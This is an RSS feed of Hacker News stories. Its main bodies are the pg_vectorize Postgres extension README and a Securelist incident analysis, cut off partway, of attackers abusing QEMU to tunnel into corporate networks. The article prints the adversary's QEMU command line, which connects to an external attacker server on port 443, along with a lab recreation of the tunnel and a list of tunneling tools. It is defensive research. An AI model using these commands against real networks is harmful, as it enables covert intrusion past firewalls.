<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0">
    <channel>
        <title>HN100 - Readable Contents</title>
        <link>https://hn.algolia.com/api/v1/search_by_date?tags=%28story,poll%29&amp;numericFilters=points%3E100</link>
        <description>Uses Readability to add bodies to the RSS feed</description>
        <lastBuildDate>Wed, 06 Mar 2024 18:00:06 GMT</lastBuildDate>
        <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
        <generator>https://github.com/jpmonette/feed</generator>
        <language>en</language>
        <item>
            <title><![CDATA[Dada, an Experiement by the Creators of Rust (343 pts)]]></title>
            <link>https://dada-lang.org/</link>
            <guid>39614433</guid>
            <pubDate>Wed, 06 Mar 2024 10:31:02 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://dada-lang.org/">https://dada-lang.org/</a>, See on <a href="https://news.ycombinator.com/item?id=39614433">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p>Copyright © 2024 the <a href="https://github.com/orgs/dada-lang/teams/dadaists">Dadaists team</a>.</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Tell HN: "Default" FileZilla download bundled with adware (162 pts)]]></title>
            <link>https://filezilla-project.org/</link>
            <guid>39613789</guid>
            <pubDate>Wed, 06 Mar 2024 08:53:09 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://filezilla-project.org/">https://filezilla-project.org/</a>, See on <a href="https://news.ycombinator.com/item?id=39613789">Hacker News</a></p>
Couldn't get https://filezilla-project.org/: Error: Request failed with status code 403]]></description>
        </item>
        <item>
            <title><![CDATA[Pg_vectorize: The simplest way to do vector search and RAG on Postgres (240 pts)]]></title>
            <link>https://github.com/tembo-io/pg_vectorize</link>
            <guid>39613669</guid>
            <pubDate>Wed, 06 Mar 2024 08:34:16 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://github.com/tembo-io/pg_vectorize">https://github.com/tembo-io/pg_vectorize</a>, See on <a href="https://news.ycombinator.com/item?id=39613669">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-hpc="true"><article itemprop="text"><div dir="auto"><h2 tabindex="-1" dir="auto">
 <b>pg_vectorize: a VectorDB for Postgres</b>
<p>

  <a href="https://tembo.io/" rel="nofollow"><img src="https://github.com/tembo-io/pg_vectorize/assets/15756360/34d65cba-065b-485f-84a4-76284e9def19" alt="pg_vectorize" width="368px"></a></p></h2><a id="user-content--pg_vectorize-a-vectordb-for-postgres--" aria-label="Permalink: pg_vectorize: a VectorDB for Postgres" href="#-pg_vectorize-a-vectordb-for-postgres--"></a></div>

<p dir="auto">A Postgres extension that automates the transformation and orchestration of text to embeddings and provides hooks into the most popular LLMs. This allows you to do vector search and build LLM applications on existing data with as little as two function calls.</p>
<p dir="auto">This project relies heavily on the work by <a href="https://github.com/pgvector/pgvector">pgvector</a> for vector similarity search, <a href="https://github.com/tembo-io/pgmq">pgmq</a> for orchestration in background workers, and <a href="https://huggingface.co/sentence-transformers" rel="nofollow">SentenceTransformers</a>.</p>
<hr>
<p dir="auto"><a href="https://join.slack.com/t/tembocommunity/shared_invite/zt-277pu7chi-NHtvHWvLhHwyK0Y5Y6vTPw" rel="nofollow"><img src="https://camo.githubusercontent.com/503899b9c81b00cb3eb72ac40b042daad8fcd5aec105d593c763646fdb04bc5b/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f25343074656d626f2d636f6d6d756e6974793f6c6f676f3d736c61636b266c6162656c3d736c61636b" alt="Static Badge" data-canonical-src="https://img.shields.io/badge/%40tembo-community?logo=slack&amp;label=slack"></a>
<a href="https://pgxn.org/dist/vectorize/" rel="nofollow"><img src="https://camo.githubusercontent.com/ea436684f6beb26a8cc5ea1cd46044990fe359e3f60bc91eda163feb4c4b5672/68747470733a2f2f62616467652e667572792e696f2f70672f766563746f72697a652e737667" alt="PGXN version" data-canonical-src="https://badge.fury.io/pg/vectorize.svg"></a>
<a href="https://ossrank.com/p/3815" rel="nofollow"><img src="https://camo.githubusercontent.com/3c42348f4c8375f58183a0d0196a77a1aae334d02695c35f38ceff59b36ba490/68747470733a2f2f736869656c64732e696f2f656e64706f696e743f75726c3d68747470733a2f2f6f737372616e6b2e636f6d2f736869656c642f33383135" alt="OSSRank" data-canonical-src="https://shields.io/endpoint?url=https://ossrank.com/shield/3815"></a></p>
<p dir="auto"><strong>API Documentation</strong>: <a href="https://tembo-io.github.io/pg_vectorize/" rel="nofollow">https://tembo-io.github.io/pg_vectorize/</a></p>
<p dir="auto"><strong>Source</strong>: <a href="https://github.com/tembo-io/pg_vectorize">https://github.com/tembo-io/pg_vectorize</a></p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Features</h2><a id="user-content-features" aria-label="Permalink: Features" href="#features"></a></p>
<ul dir="auto">
<li>Workflows for both vector search and RAG</li>
<li>Integrations with OpenAI's <a href="https://platform.openai.com/docs/guides/embeddings" rel="nofollow">embeddings</a> and <a href="https://platform.openai.com/docs/guides/text-generation" rel="nofollow">chat-completion</a> endpoints and a self-hosted container for running <a href="https://huggingface.co/sentence-transformers" rel="nofollow">Hugging Face Sentence-Transformers</a></li>
<li>Automated creation of Postgres triggers to keep your embeddings up to date</li>
<li>High level API - one function to initialize embeddings transformations, and another function to search</li>
</ul>
<p dir="auto"><h2 tabindex="-1" dir="auto">Table of Contents</h2><a id="user-content-table-of-contents" aria-label="Permalink: Table of Contents" href="#table-of-contents"></a></p>
<ul dir="auto">
<li><a href="#features">Features</a></li>
<li><a href="#table-of-contents">Table of Contents</a></li>
<li><a href="#installation">Installation</a></li>
<li><a href="#vector-search-example">Vector Search Example</a></li>
<li><a href="#rag-example">RAG Example</a></li>
<li><a href="#trigger-based-updates">Trigger based updates</a></li>
<li><a href="#try-it-on-tembo-cloud">Try it on Tembo Cloud</a></li>
</ul>
<p dir="auto"><h2 tabindex="-1" dir="auto">Installation</h2><a id="user-content-installation" aria-label="Permalink: Installation" href="#installation"></a></p>
<p dir="auto">The fastest way to get started is by running the Tembo docker container and the vector server with docker compose:</p>

<p dir="auto">Then connect to Postgres:</p>
<div data-snippet-clipboard-copy-content="docker compose exec -it postgres psql"><pre lang="text"><code>docker compose exec -it postgres psql
</code></pre></div>
<p dir="auto">Enable the extension and its dependencies</p>
<div dir="auto" data-snippet-clipboard-copy-content="CREATE EXTENSION vectorize CASCADE;"><pre>CREATE EXTENSION vectorize CASCADE;</pre></div>
<details>
<summary>Install into an existing Postgres instance</summary>
<p dir="auto">If you're installing in an existing Postgres instance, you will need the following dependencies:</p>
<p dir="auto">Rust:</p>
<ul dir="auto">
<li><a href="https://github.com/pgcentralfoundation/pgrx">pgrx toolchain</a></li>
</ul>
<p dir="auto">Postgres Extensions:</p>
<ul dir="auto">
<li><a href="https://github.com/citusdata/pg_cron">pg_cron</a> ^1.5</li>
<li><a href="https://github.com/tembo-io/pgmq">pgmq</a> ^1</li>
<li><a href="https://github.com/pgvector/pgvector">pgvector</a> ^0.5.0</li>
</ul>
<p dir="auto">Then set the following either in postgresql.conf or as a configuration parameter:</p>
<div dir="auto" data-snippet-clipboard-copy-content="-- requires restart of Postgres
alter system set shared_preload_libraries = 'vectorize,pg_cron';
alter system set cron.database_name = 'postgres'"><pre><span><span>--</span> requires restart of Postgres</span>
alter system <span>set</span> shared_preload_libraries <span>=</span> <span><span>'</span>vectorize,pg_cron<span>'</span></span>;
alter system <span>set</span> <span>cron</span>.<span>database_name</span> <span>=</span> <span><span>'</span>postgres<span>'</span></span></pre></div>
<p dir="auto">And if you're running the vector-serve container, set the following url as a configuration parameter in Postgres.
The host may need to change from <code>localhost</code> to something else depending on where you are running the container.</p>
<div dir="auto" data-snippet-clipboard-copy-content="alter system set vectorize.embedding_service_url = 'http://localhost:3000/v1/embeddings'

SELECT pg_reload_conf();"><pre>alter system <span>set</span> <span>vectorize</span>.<span>embedding_service_url</span> <span>=</span> <span><span>'</span>http://localhost:3000/v1/embeddings<span>'</span></span>

<span>SELECT</span> pg_reload_conf();</pre></div>
</details>
<p dir="auto"><h2 tabindex="-1" dir="auto">Vector Search Example</h2><a id="user-content-vector-search-example" aria-label="Permalink: Vector Search Example" href="#vector-search-example"></a></p>
<p dir="auto">Text-to-embedding transformation can be done with either Hugging Face's Sentence-Transformers or OpenAI's embeddings. The following examples use Hugging Face's Sentence-Transformers. See the project <a href="https://tembo-io.github.io/pg_vectorize/" rel="nofollow">documentation</a> for OpenAI examples.</p>
<p dir="auto">Follow the <a href="#installation">installation</a> steps if you haven't already.</p>
<p dir="auto">Setup a products table. Copy from the example data provided by the extension.</p>
<div dir="auto" data-snippet-clipboard-copy-content="CREATE TABLE products (LIKE vectorize.example_products INCLUDING ALL);
INSERT INTO products SELECT * FROM vectorize.example_products;"><pre><span>CREATE</span> <span>TABLE</span> <span>products</span> (<span>LIKE</span> <span>vectorize</span>.<span>example_products</span> INCLUDING ALL);
<span>INSERT INTO</span> products <span>SELECT</span> <span>*</span> <span>FROM</span> <span>vectorize</span>.<span>example_products</span>;</pre></div>
<div dir="auto" data-snippet-clipboard-copy-content="SELECT * FROM products limit 2;"><pre><span>SELECT</span> <span>*</span> <span>FROM</span> products <span>limit</span> <span>2</span>;</pre></div>
<div data-snippet-clipboard-copy-content=" product_id | product_name |                      description                       |        last_updated_at        
------------+--------------+--------------------------------------------------------+-------------------------------
          1 | Pencil       | Utensil used for writing and often works best on paper | 2023-07-26 17:20:43.639351-05
          2 | Laptop Stand | Elevated platform for laptops, enhancing ergonomics    | 2023-07-26 17:20:43.639351-05"><pre lang="text"><code> product_id | product_name |                      description                       |        last_updated_at        
------------+--------------+--------------------------------------------------------+-------------------------------
          1 | Pencil       | Utensil used for writing and often works best on paper | 2023-07-26 17:20:43.639351-05
          2 | Laptop Stand | Elevated platform for laptops, enhancing ergonomics    | 2023-07-26 17:20:43.639351-05
</code></pre></div>
<p dir="auto">Create a job to vectorize the products table. We'll specify the tables primary key (product_id) and the columns that we want to search (product_name and description).</p>
<div dir="auto" data-snippet-clipboard-copy-content="SELECT vectorize.table(
    job_name => 'product_search_hf',
    &quot;table&quot; => 'products',
    primary_key => 'product_id',
    columns => ARRAY['product_name', 'description'],
    transformer => 'sentence-transformers/multi-qa-MiniLM-L6-dot-v1'
);"><pre><span>SELECT</span> <span>vectorize</span>.<span>table</span>(
    job_name <span>=&gt;</span> <span><span>'</span>product_search_hf<span>'</span></span>,
    <span><span>"</span>table<span>"</span></span> <span>=&gt;</span> <span><span>'</span>products<span>'</span></span>,
    primary_key <span>=&gt;</span> <span><span>'</span>product_id<span>'</span></span>,
    columns <span>=&gt;</span> ARRAY[<span><span>'</span>product_name<span>'</span></span>, <span><span>'</span>description<span>'</span></span>],
    transformer <span>=&gt;</span> <span><span>'</span>sentence-transformers/multi-qa-MiniLM-L6-dot-v1<span>'</span></span>
);</pre></div>
<p dir="auto">This adds a new column to your table, in our case it is named <code>product_search_embeddings</code>, then populates that data with the transformed embeddings from the <code>product_name</code> and <code>description</code> columns.</p>
<p dir="auto">Then search,</p>
<div dir="auto" data-snippet-clipboard-copy-content="SELECT * FROM vectorize.search(
    job_name => 'product_search_hf',
    query => 'accessories for mobile devices',
    return_columns => ARRAY['product_id', 'product_name'],
    num_results => 3
);

                                       search_results                                        
---------------------------------------------------------------------------------------------
 {&quot;product_id&quot;: 13, &quot;product_name&quot;: &quot;Phone Charger&quot;, &quot;similarity_score&quot;: 0.8147814132322894}
 {&quot;product_id&quot;: 6, &quot;product_name&quot;: &quot;Backpack&quot;, &quot;similarity_score&quot;: 0.7743061352550308}
 {&quot;product_id&quot;: 11, &quot;product_name&quot;: &quot;Stylus Pen&quot;, &quot;similarity_score&quot;: 0.7709902653575383}"><pre><span>SELECT</span> <span>*</span> <span>FROM</span> <span>vectorize</span>.<span>search</span>(
    job_name <span>=&gt;</span> <span><span>'</span>product_search_hf<span>'</span></span>,
    query <span>=&gt;</span> <span><span>'</span>accessories for mobile devices<span>'</span></span>,
    return_columns <span>=&gt;</span> ARRAY[<span><span>'</span>product_id<span>'</span></span>, <span><span>'</span>product_name<span>'</span></span>],
    num_results <span>=&gt;</span> <span>3</span>
);

                                       search_results                                        
<span><span>--</span>-------------------------------------------------------------------------------------------</span>
 {<span><span>"</span>product_id<span>"</span></span>: <span>13</span>, <span><span>"</span>product_name<span>"</span></span>: <span><span>"</span>Phone Charger<span>"</span></span>, <span><span>"</span>similarity_score<span>"</span></span>: <span>0</span>.<span>8147814132322894</span>}
 {<span><span>"</span>product_id<span>"</span></span>: <span>6</span>, <span><span>"</span>product_name<span>"</span></span>: <span><span>"</span>Backpack<span>"</span></span>, <span><span>"</span>similarity_score<span>"</span></span>: <span>0</span>.<span>7743061352550308</span>}
 {<span><span>"</span>product_id<span>"</span></span>: <span>11</span>, <span><span>"</span>product_name<span>"</span></span>: <span><span>"</span>Stylus Pen<span>"</span></span>, <span><span>"</span>similarity_score<span>"</span></span>: <span>0</span>.<span>7709902653575383</span>}</pre></div>
<p dir="auto"><h2 tabindex="-1" dir="auto">RAG Example</h2><a id="user-content-rag-example" aria-label="Permalink: RAG Example" href="#rag-example"></a></p>
<p dir="auto">Ask raw text questions of the example  <code>products</code> dataset and get chat responses from an OpenAI LLM.</p>
<p dir="auto">Follow the <a href="#installation">installation</a> steps if you haven't already.</p>
<p dir="auto">Set the <a href="https://platform.openai.com/docs/guides/embeddings" rel="nofollow">OpenAI API key</a>, this is required to for use with OpenAI's chat-completion models.</p>
<div dir="auto" data-snippet-clipboard-copy-content="ALTER SYSTEM SET vectorize.openai_key TO '<your api key>';
SELECT pg_reload_conf();"><pre>ALTER SYSTEM <span>SET</span> <span>vectorize</span>.<span>openai_key</span> TO <span><span>'</span>&lt;your api key&gt;<span>'</span></span>;
<span>SELECT</span> pg_reload_conf();</pre></div>
<p dir="auto">Create an example table if it does not already exist.</p>
<div dir="auto" data-snippet-clipboard-copy-content="CREATE TABLE products (LIKE vectorize.example_products INCLUDING ALL);
INSERT INTO products SELECT * FROM vectorize.example_products;"><pre><span>CREATE</span> <span>TABLE</span> <span>products</span> (<span>LIKE</span> <span>vectorize</span>.<span>example_products</span> INCLUDING ALL);
<span>INSERT INTO</span> products <span>SELECT</span> <span>*</span> <span>FROM</span> <span>vectorize</span>.<span>example_products</span>;</pre></div>
<p dir="auto">Initialize a table for RAG. We'll use an open source Sentence Transformer to generate embeddings.</p>
<p dir="auto">Create a new column that we want to use as the context. In this case, we'll concatenate both <code>product_name</code> and <code>description</code>.</p>
<div dir="auto" data-snippet-clipboard-copy-content="ALTER TABLE products
ADD COLUMN context TEXT GENERATED ALWAYS AS (product_name || ': ' || description) STORED;"><pre><span>ALTER</span> <span>TABLE</span> products
ADD COLUMN context <span>TEXT</span> GENERATED ALWAYS <span>AS</span> (product_name <span>||</span> <span><span>'</span>: <span>'</span></span> <span>||</span> description) STORED;</pre></div>
<div dir="auto" data-snippet-clipboard-copy-content="SELECT vectorize.init_rag(
    agent_name => 'product_chat',
    table_name => 'products',
    &quot;column&quot; => 'context',
    unique_record_id => 'product_id',
    transformer => 'sentence-transformers/all-MiniLM-L12-v2'
);"><pre><span>SELECT</span> <span>vectorize</span>.<span>init_rag</span>(
    agent_name <span>=&gt;</span> <span><span>'</span>product_chat<span>'</span></span>,
    table_name <span>=&gt;</span> <span><span>'</span>products<span>'</span></span>,
    <span><span>"</span>column<span>"</span></span> <span>=&gt;</span> <span><span>'</span>context<span>'</span></span>,
    unique_record_id <span>=&gt;</span> <span><span>'</span>product_id<span>'</span></span>,
    transformer <span>=&gt;</span> <span><span>'</span>sentence-transformers/all-MiniLM-L12-v2<span>'</span></span>
);</pre></div>
<div dir="auto" data-snippet-clipboard-copy-content="SELECT vectorize.rag(
    agent_name => 'product_chat',
    query => 'What is a pencil?'
) -> 'chat_response';"><pre><span>SELECT</span> <span>vectorize</span>.<span>rag</span>(
    agent_name <span>=&gt;</span> <span><span>'</span>product_chat<span>'</span></span>,
    query <span>=&gt;</span> <span><span>'</span>What is a pencil?<span>'</span></span>
) <span>-</span><span>&gt;</span> <span><span>'</span>chat_response<span>'</span></span>;</pre></div>
<div data-snippet-clipboard-copy-content="&quot;A pencil is an item that is commonly used for writing and is known to be most effective on paper.&quot;"><pre lang="text"><code>"A pencil is an item that is commonly used for writing and is known to be most effective on paper."
</code></pre></div>
<p dir="auto"><h2 tabindex="-1" dir="auto">Trigger based updates</h2><a id="user-content-trigger-based-updates" aria-label="Permalink: Trigger based updates" href="#trigger-based-updates"></a></p>
<p dir="auto">When vectorize job is set up as <code>realtime</code> (the default behavior, via <code>vectorize.table(..., schedule =&gt; 'realtime')</code>), vectorize will create triggers on your table that will keep your embeddings up to date. When the text inputs are updated or if new rows are inserted, the triggers handle creating a background job that updates the embeddings. Since the transformation is executed in a background job and the transformer model is invoked in a separate container, there is minimal impact on the performance of the update or insert statement.</p>
<div dir="auto" data-snippet-clipboard-copy-content="INSERT INTO products (product_id, product_name, description)
VALUES (12345, 'pizza', 'dish of Italian origin consisting of a flattened disk of bread');

UPDATE products
SET description = 'sling made of fabric, rope, or netting, suspended between two or more points, used for swinging, sleeping, or resting'
WHERE product_name = 'Hammock';"><pre><span>INSERT INTO</span> products (product_id, product_name, description)
<span>VALUES</span> (<span>12345</span>, <span><span>'</span>pizza<span>'</span></span>, <span><span>'</span>dish of Italian origin consisting of a flattened disk of bread<span>'</span></span>);

<span>UPDATE</span> products
<span>SET</span> description <span>=</span> <span><span>'</span>sling made of fabric, rope, or netting, suspended between two or more points, used for swinging, sleeping, or resting<span>'</span></span>
<span>WHERE</span> product_name <span>=</span> <span><span>'</span>Hammock<span>'</span></span>;</pre></div>
<p dir="auto"><h2 tabindex="-1" dir="auto">Try it on Tembo Cloud</h2><a id="user-content-try-it-on-tembo-cloud" aria-label="Permalink: Try it on Tembo Cloud" href="#try-it-on-tembo-cloud"></a></p>
<p dir="auto">Try it for yourself! Install with a single click on a Vector DB Stack (or any other instance) in <a href="https://cloud.tembo.io/" rel="nofollow">Tembo Cloud</a> today.</p>
</article></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Network Tunneling with QEMU (114 pts)]]></title>
            <link>https://securelist.com/network-tunneling-with-qemu/111803/</link>
            <guid>39613198</guid>
            <pubDate>Wed, 06 Mar 2024 07:15:29 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://securelist.com/network-tunneling-with-qemu/111803/">https://securelist.com/network-tunneling-with-qemu/111803/</a>, See on <a href="https://news.ycombinator.com/item?id=39613198">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
													<p>Cyberattackers tend to give preference to legitimate tools when taking various attack steps, as these help them evade detection systems while keeping malware development costs down to a minimum. Network scanning, capturing a process memory dump, exfiltrating data, running files remotely, and even encrypting drives — all these can be done with trusted software. To gain a foothold inside a compromised infrastructure and develop the attack, adversaries can use previously installed malware or connect to the network along with employees through the company’s RDP servers or corporate VPN (to do this, attackers must have accounts with appropriate privileges). Another way to connect to the internal network of an attacked organization involves using utilities to set up network tunnels or forward network ports between corporate systems and the adversary’s servers, which allows the attackers to bypass NAT and firewalls to gain access to internal systems. It is that category of software that we would like to discuss here.</p>
<h2 id="statistics">Statistics</h2>
<p>There is currently no shortage of utilities that can be used to set up a network tunnel between two systems. Some of these connect directly, while others use a proxy, which hides the IP address of the attackers’ server. The following are the utilities we have come across while responding to cyberincidents in the last three years.</p>
<ul>
<li>Stowaway</li>
<li>ligolo</li>
<li>3proxy</li>
<li>dog-tunnel</li>
<li>chisel</li>
<li>FRP</li>
<li>ngrok</li>
<li>gs-netcat</li>
<li>plink</li>
<li>iox</li>
<li>nps</li>
</ul>
<p>The most frequently used ones were ngrok and FRP. Utilities of this type accounted for 10% of total attacks.</p>

<p>While investigating an incident at a large company a few months ago, we detected uncommon malicious activity inside one of the systems. We ran an analysis on the artifacts, only to find that the adversary had deployed and launched the following:</p>
<ul>
<li>The Angry IP Scanner network scanning utility</li>
<li>The mimikatz password, hash, and Kerberos ticket extractor, and Active Directory attack tool</li>
<li>The QEMU hardware emulator</li>
</ul>
<p>The first two were self-explanatory, but QEMU raised a few questions. What use would the malicious actors have for a virtualizer?</p>
<p>We were able to retrieve the QEMU execution command line from the memory of the compromised machine. We found that it was started without a LiveCD or disk image, which is very unusual for QEMU. These were the arguments that the adversary used to run QEMU:</p>
		<div id="crayon-65e8229cd5fb2556584465" data-settings=" minimize scroll-mouseover">
				<table>
					<tbody><tr>
				<td data-settings="hide">
					
				</td>
						<td><div><p><span>qemu</span>-<span>system</span>-<span>i386</span><span>.</span><span>exe</span><span> </span>-<span>m</span><span> </span><span>1M</span><span> </span>-<span>netdev </span><span>user</span><span>,</span><span>id</span>=<span>lan</span><span>,</span><span>restrict</span>=<span>off</span><span> </span>-<span>netdev </span></p><p><span>socket</span><span>,</span><span>id</span>=<span>sock</span><span>,</span><span>connect</span>=<span>&lt;</span><span>IP</span><span>&gt;</span><span>:</span><span>443</span><span> </span>-<span>netdev </span><span>hubport</span><span>,</span><span>id</span>=<span>port</span>-<span>lan</span><span>,</span><span>hubid</span>=<span>0</span><span>,</span><span>netdev</span>=<span>lan</span><span> </span>-<span>netdev </span></p><p><span>hubport</span><span>,</span><span>id</span>=<span>port</span>-<span>sock</span><span>,</span><span>hubid</span>=<span>0</span><span>,</span><span>netdev</span>=<span>sock</span><span> </span>-<span>nographic</span></p></div></td>
					</tr>
				</tbody></table>
			</div><p>
where &lt;IP&gt; was an external IP address.</p>
<p>Let us take a closer look at these arguments.</p>
<ul>
<li><strong>-m 1M</strong>: Specifies the RAM size to allocate to the virtual machine. This was 1 MB in this case, utterly insufficient for most operating systems.</li>
<li><strong>-netdev user,id=lan,restrict=off</strong>: Creates a virtual network interface with the name lan and type user, which allows the virtual machine to communicate with the outside world through the host network stack. The restrict=off option removes restrictions on inbound and outbound connections.</li>
<li><strong>-netdev socket,id=sock,connect=&lt;IP&gt;:443</strong>: Creates a socket-type network interface with the name sock, which provides a connection to a remote server at the specified IP address and port 443.</li>
<li><strong>-netdev hubport,id=port-lan,hubid=0,netdev=lan</strong>: Adds a port to the virtual hub with hubid=0, which is linked to the virtual network interface lan.</li>
<li><strong>-netdev hubport,id=port-sock,hubid=0,netdev=sock</strong>: Similarly to the above, this adds one more port to the virtual hub linked to the virtual network interface sock.</li>
<li><strong>-nographic</strong>: starts QEMU in non-GUI mode with console output.</li>
</ul>
<p>The IP address in the arguments grabbed our attention immediately: it was external and completely unrelated to the attacked company, so we consulted the QEMU documentation. We found that QEMU supported connections between virtual machines: the -netdev option creates network devices (backend) that can then connect to the virtual machines. Each of the numerous network devices is defined by its type and supports extra options. Below is a description of the -netdev values that were used.</p>
<h3 id="user-user-network-stack">user (user network stack)</h3>
<p>This is the simplest way of connecting a virtual machine to a network. Traffic passes through the host network stack, and the virtual machine connects to the network as if it were a regular app on the host machine.</p>
		<div id="crayon-65e8229cd5fb7917383371" data-settings=" minimize scroll-mouseover">
				<table>
					<tbody><tr>
				<td data-settings="hide">
					
				</td>
						<td><div><p><span>qemu</span>-<span>system</span>-<span>x86_64</span><span> </span>-<span>netdev </span><span>user</span><span>,</span><span>id</span>=<span>mynet0</span><span> </span>-<span>device </span><span>e1000</span><span>,</span><span>netdev</span>=<span>mynet0</span></p></div></td>
					</tr>
				</tbody></table>
			</div><p>
Here, mynet0 is the network backend ID, and e1000 is a network adapter (frontend) inside the virtual machine.</p>
<h3 id="hubport-virtual-hub">hubport (virtual hub)</h3>
<p>Connects several network devices similarly to a network hub.</p>
<h3 id="socket">socket</h3>
<p>This connects virtual machines directly through network sockets to create VM network topologies or link VMs spun up on different hosts.</p>
<p># VM1</p>
		<div id="crayon-65e8229cd5fb9785775712" data-settings=" minimize scroll-mouseover">
				<table>
					<tbody><tr>
				<td data-settings="hide">
					
				</td>
						<td><div><p><span>qemu</span>-<span>system</span>-<span>x86_64</span><span> </span>-<span>netdev </span><span>socket</span><span>,</span><span>id</span>=<span>mynet3</span><span>,</span><span>listen</span>=<span>:</span><span>1234</span><span> </span>-<span>device </span><span>e1000</span><span>,</span><span>netdev</span>=<span>mynet3</span></p></div></td>
					</tr>
				</tbody></table>
			</div><p>
# VM2, connected to VM1</p>
		<div id="crayon-65e8229cd5fba702914362" data-settings=" minimize scroll-mouseover">
				<table>
					<tbody><tr>
				<td data-settings="hide">
					
				</td>
						<td><div><p><span>qemu</span>-<span>system</span>-<span>x86_64</span><span> </span>-<span>netdev </span><span>socket</span><span>,</span><span>id</span>=<span>mynet4</span><span>,</span><span>connect</span>=<span>127.0.0.1</span><span>:</span><span>1234</span><span> </span>-<span>device </span></p><p><span>e1000</span><span>,</span><span>netdev</span>=<span>mynet4</span></p></div></td>
					</tr>
				</tbody></table>
			</div><p>
VM1 listens on port 1234, while VM2 connects to that port. This was the route the attackers took: they launched a “client” in the compromised system and had it connect to their server to open access to the corporate network where the “client” was running. It had next to no effect on the performance of the compromised system, as the adversary was using neither a disk image nor a LiveCD when running QEMU.</p>
<p>We had no way of reliably determining how the attackers ran QEMU on their own server, so we decided to test the technique described above on a bed consisting of three systems:</p>
<ul>
<li>InternalHost was located inside the network, with no internet access and running an RDP server on port 3389. It simulated the isolated system without access to the internet.</li>
<li>PivotHost was located inside the network, but it had internet access. It simulated the system that had been breached by the attackers and used for reaching InternalHost.</li>
<li>AttackerServer was hosted in the cloud, and it simulated the adversary’s server.</li>
</ul>
<p>Our aim was to reach InternalHost from AttackerServer. The image below shows the general layout of the tunnel.</p>
<div id="attachment_111806"><p><a href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/01/23153155/QEMU_persistence_01.png"><img loading="lazy" decoding="async" aria-describedby="caption-attachment-111806" src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/01/23153155/QEMU_persistence_01-970x1024.png" alt="Network tunnel diagram" width="970" height="1024" srcset="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/01/23153155/QEMU_persistence_01-970x1024.png 970w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/01/23153155/QEMU_persistence_01-284x300.png 284w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/01/23153155/QEMU_persistence_01-768x811.png 768w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/01/23153155/QEMU_persistence_01-1455x1536.png 1455w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/01/23153155/QEMU_persistence_01-332x350.png 332w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/01/23153155/QEMU_persistence_01-740x781.png 740w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/01/23153155/QEMU_persistence_01-265x280.png 265w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/01/23153155/QEMU_persistence_01-800x844.png 800w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/01/23153155/QEMU_persistence_01.png 1618w" sizes="(max-width: 970px) 100vw, 970px"></a></p><p id="caption-attachment-111806">Network tunnel diagram</p></div>
<p>We used QEMU on AttackerServer to spin up a VM from a Kali Linux LiveCD. A socket-type network device connected to the VM as a network adapter and listened on port 443.</p>
		<div id="crayon-65e8229cd5fbb705518986" data-settings=" minimize scroll-mouseover">
				<table>
					<tbody><tr>
				<td data-settings="hide">
					
				</td>
						<td><div><p><span>qemu</span>-<span>system</span>-<span>x86_64</span><span> </span>-<span>boot</span><span> </span><span>d</span><span> </span>-<span>cdrom </span><span>kali</span>-<span>linux</span>-<span>2023.3</span>-<span>live</span>-<span>amd64</span><span>.</span><span>iso</span><span> </span>-<span>m</span><span> </span><span>6048</span><span> </span>-<span>device </span></p><p><span>e1000</span><span>,</span><span>netdev</span>=<span>n1</span><span>,</span><span>mac</span>=<span>52</span><span>:</span><span>54</span><span>:</span><span>00</span><span>:</span><span>12</span><span>:</span><span>34</span><span>:</span><span>56</span><span> </span>-<span>smp</span><span> </span><span>2</span><span> </span>-<span>netdev </span><span>socket</span><span>,</span><span>id</span>=<span>n1</span><span>,</span><span>listen</span>=<span>:</span><span>443</span></p></div></td>
					</tr>
				</tbody></table>
			</div><p>
Another copy of QEMU was running on PivotHost and connecting through the socket network device to port 443 on AttackerServer in the cloud. We also connected a user-type network device, combined with socket through a hub. The QEMU startup options we used were similar to those previously used by the adversary.</p>
		<div id="crayon-65e8229cd5fbc860855617" data-settings=" minimize scroll-mouseover">
				<table>
					<tbody><tr>
				<td data-settings="hide">
					
				</td>
						<td><div><p><span>qemu</span>-<span>system</span>-<span>i386</span><span>.</span><span>exe</span><span> </span>-<span>m</span><span> </span><span>1M</span><span> </span>-<span>netdev </span><span>user</span><span>,</span><span>id</span>=<span>lan</span><span>,</span><span>restrict</span>=<span>off</span><span> </span>-<span>netdev </span></p><p><span>socket</span><span>,</span><span>id</span>=<span>sock</span><span>,</span><span>connect</span>=<span>&lt;</span><span>AttackerServer</span><span>&gt;</span><span>:</span><span>443</span><span> </span>-<span>netdev </span><span>hubport</span><span>,</span><span>id</span>=<span>port</span>-</p><p><span>lan</span><span>,</span><span>hubid</span>=<span>0</span><span>,</span><span>netdev</span>=<span>lan</span><span> </span>-<span>netdev </span><span>hubport</span><span>,</span><span>id</span>=<span>port</span>-<span>sock</span><span>,</span><span>hubid</span>=<span>0</span><span>,</span><span>netdev</span>=<span>sock</span><span> </span>-<span>nographic</span></p></div></td>
					</tr>
				</tbody></table>
			</div><p>
Once started, QEMU set up a network tunnel from PivotHost to AttackerServer, or more precisely, to the Kali Linux VM. Kali Linux could scan the subnet to which PivotHost was connected for other systems.</p>
